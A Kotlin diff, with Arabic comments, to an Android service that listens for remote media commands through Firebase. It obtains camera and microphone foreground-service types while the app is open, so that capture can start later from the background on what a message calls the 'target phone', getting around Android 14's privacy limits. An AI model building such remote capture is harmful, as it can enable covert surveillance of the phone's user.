@@ -117,19 +117,44 @@ class MediaSessionService : Service() {
             }
     }
 
-    private fun startAsListener() {
+    /**
+     * نوع الخدمة الأمامية أثناء الاستماع. أندرويد 14 يرفض النوع 0، ولا يسمح بترقية الخدمة إلى
+     * camera/microphone من الخلفية؛ لذلك نبدأ الاستماع (والتطبيق ظاهر) بهذه الأنواع إن كانت
+     * الأذونات ممنوحة، فتبقى صالحة عند وصول الأمر والتطبيق في الخلفية.
+     */
+    private fun listenerFgsType(): Int {
+        if (Build.VERSION.SDK_INT < 29) return 0
+        var t = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+        if (Build.VERSION.SDK_INT >= 30) {
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
+                t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+            if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
+                t = t or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
+        }
+        return t
+    }
+
+    private fun showListenerForeground() {
         ensureChannel()
         val n = baseNotif("في انتظار أوامر الوسائط", ongoing = true, stopAction = false)
         try {
             if (Build.VERSION.SDK_INT >= 29) {
-                ServiceCompat.startForeground(this, NOTIF_ID, n, 0)
+                ServiceCompat.startForeground(this, NOTIF_ID, n, listenerFgsType())
             } else {
                 startForeground(NOTIF_ID, n)
             }
         } catch (_: Exception) {
-            try { startForeground(NOTIF_ID, n) } catch (_: Exception) {}
+            try {
+                if (Build.VERSION.SDK_INT >= 29) {
+                    ServiceCompat.startForeground(this, NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+                } else {
+                    startForeground(NOTIF_ID, n)
+                }
+            } catch (_: Exception) {}
         }
     }
+
+    private fun startAsListener() = showListenerForeground()
 
     private fun startSession(newMode: String) {
         val store = Store(this)
@@ -207,9 +232,14 @@ class MediaSessionService : Service() {
                 startForeground(NOTIF_ID, notif)
             }
         } catch (e: Exception) {
-            updateStatus(uid, "error", "تعذّر بدء الخدمة الأمامية: ${e.message}")
-            sessionActive = false
-            return
+            // الخدمة تعمل أصلاً بأنواعها منذ بدء الاستماع؛ جرّب المتابعة بدل الفشل الكامل
+            if (Build.VERSION.SDK_INT >= 34 && e is SecurityException && cmdReg != null) {
+                // لا شيء: نكمل بالأنواع الحالية
+            } else {
+                updateStatus(uid, "error", "تعذّر بدء الخدمة الأمامية (افتح التطبيق على الهاتف الهدف ثم أعد الطلب): ${e.message}")
+                sessionActive = false
+                return
+            }
         }
 
         val ok = when (newMode) {
@@ -488,15 +518,7 @@ class MediaSessionService : Service() {
         val uid = FirebaseAuth.getInstance().currentUser?.uid
         updateStatus(uid, status, message)
         if (uid != null && cmdReg != null) {
-            ensureChannel()
-            val n = baseNotif("في انتظار أوامر الوسائط", ongoing = true, stopAction = false)
-            try {
-                if (Build.VERSION.SDK_INT >= 29) {
-                    ServiceCompat.startForeground(this, NOTIF_ID, n, 0)
-                } else {
-                    startForeground(NOTIF_ID, n)
-                }
-            } catch (_: Exception) {}
+            showListenerForeground()
         } else {
             stopForeground(STOP_FOREGROUND_REMOVE)
             stopSelf()
